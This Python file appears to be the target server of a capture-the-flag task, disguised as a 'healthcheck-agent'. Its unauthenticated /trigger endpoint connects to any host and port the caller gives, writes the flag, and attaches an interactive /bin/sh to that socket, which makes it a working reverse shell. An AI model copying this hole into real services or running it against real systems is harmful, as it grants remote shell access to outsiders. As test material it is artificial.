import os
import socket
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

def _load_flag():
    # The task runner hands the flag over as a one-shot file so it never sits in the container
    # environment (visible to every shell as $FLAG and in /proc/*/environ).
    try:
        with open("/.lenta-flag") as f:
            flag = f.read().strip()
        os.remove("/.lenta-flag")
        return flag
    except OSError:
        return os.environ.pop("FLAG", "MISSING_FLAG")


FLAG = _load_flag()

FORM = b"""<!doctype html><html><body>
<h1>\xd0\x92\xd0\xbd\xd1\x83\xd1\x82\xd1\x80\xd0\xb5\xd0\xbd\xd0\xbd\xd0\xb8\xd0\xb9 healthcheck-agent</h1>
<p>/trigger?host=HOST&amp;port=PORT \xd0\xbe\xd1\x82\xd0\xba\xd1\x80\xd1\x8b\xd0\xb2\xd0\xb0\xd0\xb5\xd1\x82 \xd0\xbe\xd0\xb1\xd1\x80\xd0\xb0\xd1\x82\xd0\xbd\xd0\xbe\xd0\xb5 \xd1\x81\xd0\xbe\xd0\xb5\xd0\xb4\xd0\xb8\xd0\xbd\xd0\xb5\xd0\xbd\xd0\xb8\xd0\xb5 \xd0\xba \xd1\x83\xd0\xba\xd0\xb0\xd0\xb7\xd0\xb0\xd0\xbd\xd0\xbd\xd0\xbe\xd0\xbc\xd1\x83 \xd0\xb0\xd0\xb4\xd1\x80\xd0\xb5\xd1\x81\xd1\x83.</p>
</body></html>"""

class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/":
            self.respond(200, "text/html", FORM)
            return
        if parsed.path == "/trigger":
            qs = parse_qs(parsed.query)
            host = qs.get("host", [""])[0]
            port = qs.get("port", [""])[0]
            if not host or not port:
                self.respond(400, "text/plain", b"Missing host/port\n")
                return
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, int(port)))
            except OSError as e:
                self.respond(502, "text/plain", f"connect failed: {e}\n".encode())
                return

            # A real reverse connection back to the caller succeeded — that's the
            # actual exploit condition, so this is where the flag is earned.
            os.makedirs("/tmp/proof", exist_ok=True)
            with open("/tmp/proof/reverse-shell-confirmed", "w") as f:
                f.write(FLAG)

            pid = os.fork()
            if pid == 0:
                try:
                    os.dup2(s.fileno(), 0)
                    os.dup2(s.fileno(), 1)
                    os.dup2(s.fileno(), 2)
                    os.execvp("/bin/sh", ["/bin/sh", "-i"])
                finally:
                    os._exit(0)
            s.close()
            self.respond(200, "text/plain", b"triggered\n")
            return
        self.respond(404, "text/plain", b"Not found")

    def respond(self, code, ctype, body):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 9090), Handler).serve_forever()
